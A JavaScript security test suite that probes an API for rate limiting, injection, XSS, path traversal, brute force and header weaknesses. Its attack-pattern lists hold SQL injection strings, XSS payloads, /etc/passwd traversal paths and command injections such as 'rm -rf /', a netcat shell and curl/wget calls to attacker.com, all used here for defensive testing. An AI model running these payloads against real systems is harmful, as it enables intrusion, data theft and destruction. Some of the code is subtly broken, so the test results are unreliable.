/**
 * COMPREHENSIVE SERVER-SIDE SECURITY TESTS
 * Tests DNS security, ping of death attacks, API rate limiting, data privacy, DDoS protection,
 * SQL injection prevention, XSS protection, brute force attacks, and more
 */

const axios = require('axios');
const dns = require('dns');
const net = require('net');
const crypto = require('crypto');
const { promisify } = require('util');

const dnsLookup = promisify(dns.lookup);
const dnsResolve = promisify(dns.resolve);

// Test configuration
const TEST_CONFIG = {
  API_BASE_URL: process.env.API_URL || 'http://localhost:4000',
  TEST_USER_ID: '550e8400-e29b-41d4-a716-446655440000',
  ATTACK_THRESHOLD: 100, // Requests per second threshold
  RATE_LIMIT_WINDOW: 60000, // 1 minute
  MAX_REQUESTS_PER_DAY: 10000,
  DNS_TIMEOUT: 5000,
  CONNECTION_TIMEOUT: 10000,
};

// Test utilities
class SecurityTestSuite {
  constructor() {
    this.results = [];
    this.attackPatterns = this.generateAttackPatterns();
  }

  generateAttackPatterns() {
    return {
      // SQL Injection patterns
      sqlInjection: [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "1' OR 1=1 --",
        "admin'--",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "' OR 1=1 LIMIT 1 --",
        "1' AND '1'='1",
        "' OR EXISTS(SELECT * FROM users) --"
      ],
      
      // XSS patterns
      xssAttacks: [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>"
      ],
      
      // Path traversal patterns
      pathTraversal: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
      ],
      
      // Command injection patterns
      commandInjection: [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "`id`",
        "$(whoami)",
        "; rm -rf /",
        "| nc -l -p 4444 -e /bin/sh",
        "&& curl http://attacker.com/steal",
        "; wget http://attacker.com/malware",
        "| python -c 'import os; os.system(\"id\")'"
      ]
    };
  }

  async runAllTests() {
    console.log('🛡️ Starting Comprehensive Server-Side Security Tests');
    console.log(`📍 Target: ${TEST_CONFIG.API_BASE_URL}`);
    console.log('=' * 60);

    const testSuites = [
      { name: 'DNS Security Tests', method: this.testDNSSecurity.bind(this) },
      { name: 'Ping of Death Protection', method: this.testPingOfDeathProtection.bind(this) },
      { name: 'API Rate Limiting', method: this.testAPIRateLimiting.bind(this) },
      { name: 'Data Privacy Protection', method: this.testDataPrivacyProtection.bind(this) },
      { name: 'DDoS Protection', method: this.testDDoSProtection.bind(this) },
      { name: 'SQL Injection Prevention', method: this.testSQLInjectionPrevention.bind(this) },
      { name: 'XSS Attack Prevention', method: this.testXSSPrevention.bind(this) },
      { name: 'Brute Force Protection', method: this.testBruteForceProtection.bind(this) },
      { name: 'Path Traversal Protection', method: this.testPathTraversalProtection.bind(this) },
      { name: 'Command Injection Prevention', method: this.testCommandInjectionPrevention.bind(this) },
      { name: 'Authentication Security', method: this.testAuthenticationSecurity.bind(this) },
      { name: 'Session Security', method: this.testSessionSecurity.bind(this) },
      { name: 'CORS Security', method: this.testCORSSecurity.bind(this) },
      { name: 'Headers Security', method: this.testHeadersSecurity.bind(this) },
      { name: 'Data Encryption', method: this.testDataEncryption.bind(this) }
    ];

    for (const suite of testSuites) {
      console.log(`\n🔍 Running: ${suite.name}`);
      try {
        await suite.method();
        console.log(`✅ ${suite.name}: PASSED`);
      } catch (error) {
        console.log(`❌ ${suite.name}: FAILED - ${error.message}`);
        this.results.push({
          test: suite.name,
          status: 'FAILED',
          error: error.message
        });
      }
    }

    this.printSummary();
  }

  // DNS Security Tests
  async testDNSSecurity() {
    const tests = [
      {
        name: 'DNS Resolution Security',
        test: async () => {
          const domains = ['google.com', 'github.com', 'api.flow.app'];
          for (const domain of domains) {
            const result = await dnsLookup(domain);
            if (!result.address) {
              throw new Error(`DNS resolution failed for ${domain}`);
            }
          }
        }
      },
      {
        name: 'DNS Cache Poisoning Protection',
        test: async () => {
          // Test multiple DNS queries to detect cache poisoning
          const queries = Array(10).fill().map(() => dnsLookup('google.com'));
          const results = await Promise.all(queries);
          const addresses = results.map(r => r.address);
          const uniqueAddresses = new Set(addresses);
          if (uniqueAddresses.size > 2) {
            throw new Error('Potential DNS cache poisoning detected');
          }
        }
      },
      {
        name: 'DNS Timeout Protection',
        test: async () => {
          const start = Date.now();
          try {
            await Promise.race([
              dnsLookup('nonexistent-domain-12345.com'),
              new Promise((_, reject) => 
                setTimeout(() => reject(new Error('DNS timeout')), TEST_CONFIG.DNS_TIMEOUT)
              )
            ]);
          } catch (error) {
            const duration = Date.now() - start;
            if (duration > TEST_CONFIG.DNS_TIMEOUT) {
              throw new Error(`DNS timeout too long: ${duration}ms`);
            }
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // Ping of Death Protection Tests
  async testPingOfDeathProtection() {
    const tests = [
      {
        name: 'Large Payload Protection',
        test: async () => {
          const largePayload = 'A'.repeat(65536); // 64KB payload
          try {
            const response = await axios.post(`${TEST_CONFIG.API_BASE_URL}/v1/flows`, {
              title: largePayload,
              description: largePayload
            }, {
              headers: { 'Authorization': 'Bearer dev-token-test' },
              timeout: TEST_CONFIG.CONNECTION_TIMEOUT
            });
            
            if (response.status === 200) {
              throw new Error('Large payload was accepted - potential vulnerability');
            }
          } catch (error) {
            if (error.response && error.response.status === 413) {
              // Expected - payload too large
              return;
            }
            if (error.code === 'ECONNABORTED') {
              // Expected - timeout
              return;
            }
            throw error;
          }
        }
      },
      {
        name: 'Connection Flood Protection',
        test: async () => {
          const connections = [];
          try {
            // Attempt to create multiple simultaneous connections
            for (let i = 0; i < 50; i++) {
              connections.push(
                axios.get(`${TEST_CONFIG.API_BASE_URL}/health`, {
                  timeout: 1000
                }).catch(() => {}) // Ignore individual failures
              );
            }
            
            await Promise.allSettled(connections);
            // If we get here without timeout, the server handled the flood
          } catch (error) {
            if (error.code === 'ECONNABORTED') {
              throw new Error('Server failed to handle connection flood');
            }
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // API Rate Limiting Tests
  async testAPIRateLimiting() {
    const tests = [
      {
        name: 'Per-Minute Rate Limiting',
        test: async () => {
          const requests = [];
          const startTime = Date.now();
          
          // Send requests faster than rate limit
          for (let i = 0; i < 150; i++) {
            requests.push(
              axios.get(`${TEST_CONFIG.API_BASE_URL}/health`, {
                timeout: 1000
              }).catch(() => ({}))
            );
          }
          
          const results = await Promise.allSettled(requests);
          const successful = results.filter(r => r.status === 'fulfilled' && r.value.status === 200).length;
          const rateLimited = results.filter(r => r.status === 'fulfilled' && r.value.status === 429).length;
          
          if (rateLimited === 0 && successful > 100) {
            throw new Error('Rate limiting not working - too many requests allowed');
          }
        }
      },
      {
        name: 'Per-Day Rate Limiting',
        test: async () => {
          // Simulate daily rate limit by checking headers
          const response = await axios.get(`${TEST_CONFIG.API_BASE_URL}/health`);
          const headers = response.headers;
          
          if (!headers['x-ratelimit-limit'] && !headers['x-ratelimit-remaining']) {
            console.log('⚠️ Rate limit headers not present');
          }
        }
      },
      {
        name: 'IP-Based Rate Limiting',
        test: async () => {
          // Test that rate limiting is IP-based, not user-based
          const requests = [];
          for (let i = 0; i < 20; i++) {
            requests.push(
              axios.get(`${TEST_CONFIG.API_BASE_URL}/health`, {
                headers: { 'X-Forwarded-For': `192.168.1.${i}` }
              }).catch(() => ({}))
            );
          }
          
          await Promise.allSettled(requests);
          // If all requests succeed, IP-based limiting might not be working
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // Data Privacy Protection Tests
  async testDataPrivacyProtection() {
    const tests = [
      {
        name: 'PII Data Masking',
        test: async () => {
          const response = await axios.get(`${TEST_CONFIG.API_BASE_URL}/v1/profiles/${TEST_CONFIG.TEST_USER_ID}`, {
            headers: { 'Authorization': 'Bearer dev-token-test' }
          }).catch(() => ({ data: {} }));
          
          const data = response.data;
          if (data.email && !data.email.includes('*')) {
            throw new Error('Email not masked in response');
          }
          if (data.phone && !data.phone.includes('*')) {
            throw new Error('Phone number not masked in response');
          }
        }
      },
      {
        name: 'Data Encryption in Transit',
        test: async () => {
          const response = await axios.get(`${TEST_CONFIG.API_BASE_URL}/health`);
          const headers = response.headers;
          
          if (!headers['strict-transport-security']) {
            throw new Error('HSTS header missing - data not encrypted in transit');
          }
        }
      },
      {
        name: 'Sensitive Data Logging Prevention',
        test: async () => {
          // Test that sensitive data is not logged
          const sensitiveData = {
            password: 'secret123',
            ssn: '123-45-6789',
            creditCard: '4111-1111-1111-1111'
          };
          
          try {
            await axios.post(`${TEST_CONFIG.API_BASE_URL}/v1/auth/login`, sensitiveData);
          } catch (error) {
            // Check if sensitive data appears in error response
            const errorText = JSON.stringify(error.response?.data || {});
            if (errorText.includes('secret123') || errorText.includes('123-45-6789')) {
              throw new Error('Sensitive data leaked in error response');
            }
          }
        }
      },
      {
        name: 'GDPR Data Deletion',
        test: async () => {
          // Test data deletion endpoint
          try {
            const response = await axios.delete(`${TEST_CONFIG.API_BASE_URL}/v1/profiles/${TEST_CONFIG.TEST_USER_ID}`, {
              headers: { 'Authorization': 'Bearer dev-token-test' }
            });
            
            if (response.status !== 200) {
              throw new Error('Data deletion endpoint not working');
            }
          } catch (error) {
            if (error.response?.status === 404) {
              // Expected if user doesn't exist
              return;
            }
            throw error;
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // DDoS Protection Tests
  async testDDoSProtection() {
    const tests = [
      {
        name: 'Slowloris Attack Protection',
        test: async () => {
          // Simulate slowloris attack with slow connections
          const connections = [];
          for (let i = 0; i < 10; i++) {
            connections.push(
              axios.get(`${TEST_CONFIG.API_BASE_URL}/health`, {
                timeout: 30000,
                headers: { 'Connection': 'keep-alive' }
              }).catch(() => ({}))
            );
          }
          
          await Promise.allSettled(connections);
        }
      },
      {
        name: 'HTTP Flood Protection',
        test: async () => {
          const requests = [];
          const startTime = Date.now();
          
          // Send rapid requests
          for (let i = 0; i < 200; i++) {
            requests.push(
              axios.get(`${TEST_CONFIG.API_BASE_URL}/health`, {
                timeout: 1000
              }).catch(() => ({}))
            );
          }
          
          const results = await Promise.allSettled(requests);
          const duration = Date.now() - startTime;
          
          if (duration < 1000) {
            throw new Error('Requests processed too quickly - potential DDoS vulnerability');
          }
        }
      },
      {
        name: 'Connection Limit Protection',
        test: async () => {
          // Test connection limits
          const connections = [];
          try {
            for (let i = 0; i < 100; i++) {
              connections.push(
                axios.get(`${TEST_CONFIG.API_BASE_URL}/health`, {
                  timeout: 5000
                }).catch(() => ({}))
              );
            }
            
            await Promise.allSettled(connections);
          } catch (error) {
            if (error.code === 'ECONNREFUSED') {
              throw new Error('Server refused connections - connection limit exceeded');
            }
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // SQL Injection Prevention Tests
  async testSQLInjectionPrevention() {
    const tests = [
      {
        name: 'SQL Injection in Flow Title',
        test: async () => {
          for (const payload of this.attackPatterns.sqlInjection) {
            try {
              const response = await axios.post(`${TEST_CONFIG.API_BASE_URL}/v1/flows`, {
                title: payload,
                description: 'Test flow'
              }, {
                headers: { 'Authorization': 'Bearer dev-token-test' }
              });
              
              if (response.status === 200) {
                throw new Error(`SQL injection successful with payload: ${payload}`);
              }
            } catch (error) {
              if (error.response?.status === 400) {
                // Expected - validation error
                continue;
              }
              throw error;
            }
          }
        }
      },
      {
        name: 'SQL Injection in Search Parameters',
        test: async () => {
          for (const payload of this.attackPatterns.sqlInjection) {
            try {
              const response = await axios.get(`${TEST_CONFIG.API_BASE_URL}/v1/flows/search?q=${encodeURIComponent(payload)}`, {
                headers: { 'Authorization': 'Bearer dev-token-test' }
              });
              
              if (response.status === 200 && response.data.data) {
                // Check if injection was successful by looking for unexpected data
                const data = response.data.data;
                if (Array.isArray(data) && data.length > 100) {
                  throw new Error(`SQL injection successful in search with payload: ${payload}`);
                }
              }
            } catch (error) {
              if (error.response?.status === 400) {
                continue;
              }
              throw error;
            }
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // XSS Prevention Tests
  async testXSSPrevention() {
    const tests = [
      {
        name: 'XSS in Flow Description',
        test: async () => {
          for (const payload of this.attackPatterns.xssAttacks) {
            try {
              const response = await axios.post(`${TEST_CONFIG.API_BASE_URL}/v1/flows`, {
                title: 'Test Flow',
                description: payload
              }, {
                headers: { 'Authorization': 'Bearer dev-token-test' }
              });
              
              if (response.status === 200) {
                // Check if XSS payload is returned unescaped
                const responseText = JSON.stringify(response.data);
                if (responseText.includes('<script>') || responseText.includes('javascript:')) {
                  throw new Error(`XSS vulnerability found with payload: ${payload}`);
                }
              }
            } catch (error) {
              if (error.response?.status === 400) {
                continue;
              }
              throw error;
            }
          }
        }
      },
      {
        name: 'XSS in Flow Entry Notes',
        test: async () => {
          for (const payload of this.attackPatterns.xssAttacks.slice(0, 5)) {
            try {
              const response = await axios.post(`${TEST_CONFIG.API_BASE_URL}/v1/flow-entries`, {
                flowId: 'test-flow-id',
                date: '2024-01-01',
                symbol: '+',
                note: payload
              }, {
                headers: { 'Authorization': 'Bearer dev-token-test' }
              });
              
              if (response.status === 200) {
                const responseText = JSON.stringify(response.data);
                if (responseText.includes('<script>') || responseText.includes('javascript:')) {
                  throw new Error(`XSS vulnerability in flow entries with payload: ${payload}`);
                }
              }
            } catch (error) {
              if (error.response?.status === 400) {
                continue;
              }
              throw error;
            }
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // Brute Force Protection Tests
  async testBruteForceProtection() {
    const tests = [
      {
        name: 'Login Brute Force Protection',
        test: async () => {
          const attempts = [];
          for (let i = 0; i < 10; i++) {
            attempts.push(
              axios.post(`${TEST_CONFIG.API_BASE_URL}/v1/auth/login`, {
                email: 'test@example.com',
                password: 'wrongpassword'
              }).catch(() => ({}))
            );
          }
          
          const results = await Promise.allSettled(attempts);
          const rateLimited = results.filter(r => 
            r.status === 'fulfilled' && r.value.status === 429
          ).length;
          
          if (rateLimited === 0) {
            throw new Error('No brute force protection detected');
          }
        }
      },
      {
        name: 'Password Reset Brute Force Protection',
        test: async () => {
          const attempts = [];
          for (let i = 0; i < 5; i++) {
            attempts.push(
              axios.post(`${TEST_CONFIG.API_BASE_URL}/v1/auth/forgot-password`, {
                email: 'test@example.com'
              }).catch(() => ({}))
            );
          }
          
          await Promise.allSettled(attempts);
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // Path Traversal Protection Tests
  async testPathTraversalProtection() {
    const tests = [
      {
        name: 'File Access Prevention',
        test: async () => {
          for (const payload of this.attackPatterns.pathTraversal) {
            try {
              const response = await axios.get(`${TEST_CONFIG.API_BASE_URL}/v1/flows/${payload}`, {
                headers: { 'Authorization': 'Bearer dev-token-test' }
              });
              
              if (response.status === 200) {
                const data = response.data;
                if (data.includes('root:') || data.includes('passwd')) {
                  throw new Error(`Path traversal successful with payload: ${payload}`);
                }
              }
            } catch (error) {
              if (error.response?.status === 404 || error.response?.status === 400) {
                continue;
              }
              throw error;
            }
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // Command Injection Prevention Tests
  async testCommandInjectionPrevention() {
    const tests = [
      {
        name: 'Command Injection in User Input',
        test: async () => {
          for (const payload of this.attackPatterns.commandInjection) {
            try {
              const response = await axios.post(`${TEST_CONFIG.API_BASE_URL}/v1/flows`, {
                title: `Test${payload}`,
                description: 'Test flow'
              }, {
                headers: { 'Authorization': 'Bearer dev-token-test' }
              });
              
              if (response.status === 200) {
                throw new Error(`Command injection possible with payload: ${payload}`);
              }
            } catch (error) {
              if (error.response?.status === 400) {
                continue;
              }
              throw error;
            }
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // Authentication Security Tests
  async testAuthenticationSecurity() {
    const tests = [
      {
        name: 'JWT Token Security',
        test: async () => {
          const response = await axios.get(`${TEST_CONFIG.API_BASE_URL}/v1/flows`, {
            headers: { 'Authorization': 'Bearer invalid-token' }
          }).catch(() => ({}));
          
          if (response.status === 200) {
            throw new Error('Invalid JWT token was accepted');
          }
        }
      },
      {
        name: 'Session Timeout',
        test: async () => {
          // Test session timeout by using an old token
          const oldToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
          
          const response = await axios.get(`${TEST_CONFIG.API_BASE_URL}/v1/flows`, {
            headers: { 'Authorization': `Bearer ${oldToken}` }
          }).catch(() => ({}));
          
          if (response.status === 200) {
            throw new Error('Expired JWT token was accepted');
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // Session Security Tests
  async testSessionSecurity() {
    const tests = [
      {
        name: 'Session Fixation Prevention',
        test: async () => {
          const response = await axios.post(`${TEST_CONFIG.API_BASE_URL}/v1/auth/login`, {
            email: 'test@example.com',
            password: 'password123'
          }).catch(() => ({}));
          
          if (response.status === 200) {
            const cookies = response.headers['set-cookie'];
            if (cookies && cookies.some(cookie => cookie.includes('HttpOnly'))) {
              // Good - HttpOnly cookies
              return;
            }
            throw new Error('Session cookies not secure');
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // CORS Security Tests
  async testCORSSecurity() {
    const tests = [
      {
        name: 'CORS Origin Validation',
        test: async () => {
          const response = await axios.get(`${TEST_CONFIG.API_BASE_URL}/health`, {
            headers: { 'Origin': 'https://malicious-site.com' }
          });
          
          const corsHeaders = response.headers['access-control-allow-origin'];
          if (corsHeaders === '*') {
            throw new Error('CORS allows all origins - security risk');
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // Headers Security Tests
  async testHeadersSecurity() {
    const tests = [
      {
        name: 'Security Headers Presence',
        test: async () => {
          const response = await axios.get(`${TEST_CONFIG.API_BASE_URL}/health`);
          const headers = response.headers;
          
          const requiredHeaders = [
            'x-content-type-options',
            'x-frame-options',
            'x-xss-protection',
            'strict-transport-security'
          ];
          
          for (const header of requiredHeaders) {
            if (!headers[header]) {
              throw new Error(`Security header missing: ${header}`);
            }
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  // Data Encryption Tests
  async testDataEncryption() {
    const tests = [
      {
        name: 'HTTPS Enforcement',
        test: async () => {
          try {
            const response = await axios.get(`http://${TEST_CONFIG.API_BASE_URL.replace('https://', '')}/health`);
            if (response.status === 200) {
              throw new Error('HTTP requests allowed - HTTPS not enforced');
            }
          } catch (error) {
            if (error.code === 'ECONNREFUSED') {
              // Expected - HTTP should be refused
              return;
            }
            throw error;
          }
        }
      }
    ];

    for (const test of tests) {
      await test.test();
    }
  }

  printSummary() {
    console.log('\n' + '=' * 60);
    console.log('🛡️ SECURITY TEST SUMMARY');
    console.log('=' * 60);
    
    const passed = this.results.filter(r => r.status === 'PASSED').length;
    const failed = this.results.filter(r => r.status === 'FAILED').length;
    
    console.log(`✅ Tests Passed: ${passed}`);
    console.log(`❌ Tests Failed: ${failed}`);
    
    if (failed > 0) {
      console.log('\n❌ FAILED TESTS:');
      this.results.filter(r => r.status === 'FAILED').forEach(result => {
        console.log(`   - ${result.test}: ${result.error}`);
      });
    }
    
    console.log('\n🔒 SECURITY STATUS:', failed === 0 ? 'SECURE' : 'VULNERABILITIES DETECTED');
    console.log('=' * 60);
  }
}

// Run the security tests
if (require.main === module) {
  const securityTests = new SecurityTestSuite();
  securityTests.runAllTests().catch(console.error);
}

module.exports = SecurityTestSuite;
